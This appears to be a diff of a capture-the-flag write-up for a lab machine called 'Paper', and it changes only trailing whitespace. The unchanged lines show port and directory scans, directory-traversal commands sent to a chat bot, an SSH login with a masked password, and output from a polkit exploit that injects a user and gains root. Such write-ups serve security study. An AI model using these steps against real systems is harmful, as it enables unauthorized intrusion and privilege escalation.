@@ -14,18 +14,18 @@ Host is up (0.024s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
 |   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
 |_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
 80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
 |_http-title: HTTP Server Test Page powered by CentOS
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
 |_http-title: HTTP Server Test Page powered by CentOS
@@ -35,7 +35,7 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2022-07-08T10:32:34
 |_ssl-date: TLS randomness does not represent time
 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -77,9 +77,9 @@ by Ben "epi" Risher 🤓                 ver: 2.9.3
 403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 200      GET       27l      138w    10208c https://10.129.38.169/poweredby.png
 403      GET       70l     2438w   199691c https://10.129.38.169/
-[####################] - 8s     40950/40950   0s      found:2       errors:0      
-[####################] - 6s     20469/20469   3108/s  https://10.129.38.169/ 
-[####################] - 6s     20469/20469   3184/s  https://10.129.38.169/cgi-bin/ 
+[####################] - 8s     40950/40950   0s      found:2       errors:0
+[####################] - 6s     20469/20469   3108/s  https://10.129.38.169/
+[####################] - 6s     20469/20469   3184/s  https://10.129.38.169/cgi-bin/
 ```
 
 Getting some header information if we can access `http` port:
@@ -106,17 +106,16 @@ Enumerating the new website:
 $ feroxbuster -u http://office.paper/ -A -k -d 4 --filter-status 404 --smart --output web_paper.txt -w /usr/share/wordlists/dirb/common.txt --dont-scan http://office.paper/manual/
 
 http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fadmin.php&reauth=1
-[####################] - 1s      4619/4614    2615/s  http://office.paper/ 
-[####################] - 1s      4683/4683    2349/s  http://office.paper/cgi-bin/ 
-[###>----------------] - 2m       803/4614    6/s     http://office.paper/index.php/comments/feed/ 
-[####################] - 21s     4683/4683    252/s   http://office.paper/wp-admin/ 
-[####################] - 20s     4683/4683    261/s   http://office.paper/wp-content/ 
-[####################] - 21s     4683/4683    246/s   http://office.paper/wp-includes/ 
+[####################] - 1s      4619/4614    2615/s  http://office.paper/
+[####################] - 1s      4683/4683    2349/s  http://office.paper/cgi-bin/
+[###>----------------] - 2m       803/4614    6/s     http://office.paper/index.php/comments/feed/
+[####################] - 21s     4683/4683    252/s   http://office.paper/wp-admin/
+[####################] - 20s     4683/4683    261/s   http://office.paper/wp-content/
+[####################] - 21s     4683/4683    246/s   http://office.paper/wp-includes/
   4: Pages similar to: http://office.paper/c3c9cc8a1288425987463daf8a29d323
   5: Pages similar to: http://office.paper/.htaccessd04b93346d4f4fe1a00d8c72ed1252d6
   6: GET requests with 404 responses containing 18985 bytes, 882 words, and 199 lines
   7: Pages similar to: http://office.paper/index.php/comments/feed/4f4e57c94487424b8c211c4777ca1b11
-
 ```
 
 ### Attack
@@ -189,7 +188,7 @@ Using this, we added new subdomain to `/etc/hosts`. After login, we can see the 
 Executing following commands to enumerate the machine:
 ```
 recyclops time
-recyclops list / 
+recyclops list /
 recyclops file /sale/portfolio.txt
 recyclops list /../
 # dwight user
@@ -222,7 +221,7 @@ dwight@office.paper's password: Queen***********
 Activate the web console with: systemctl enable --now cockpit.socket
 
 Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
-[dwight@paper ~]$ cat user.txt 
+[dwight@paper ~]$ cat user.txt
 ~~~~~~~~~~~~FLAG~~~~~~~~~~~~
 ```
 
@@ -261,7 +260,7 @@ Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is require
 [!] Inserting password hash...
 [!] It looks like the password insertion was succesful!
 [!] Try to login as the injected user using su - sec
-[!] When prompted for password, enter your password 
+[!] When prompted for password, enter your password
 [!] If the username is inserted, but the login fails; try running the exploit again.
 [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
 ```
@@ -269,7 +268,7 @@ Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is require
 Gaining the root shell with the new credentials:
 ```
 [dwight@paper ~]$ su - sec
-Password: 
+Password:
 [sec@paper ~]$ sudo bash
 
 We trust you have received the usual lecture from the local System
@@ -279,7 +278,7 @@ Administrator. It usually boils down to these three things:
     #2) Think before you type.
     #3) With great power comes great responsibility.
 
-[sudo] password for sec: 
+[sudo] password for sec:
 [root@paper sec]# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
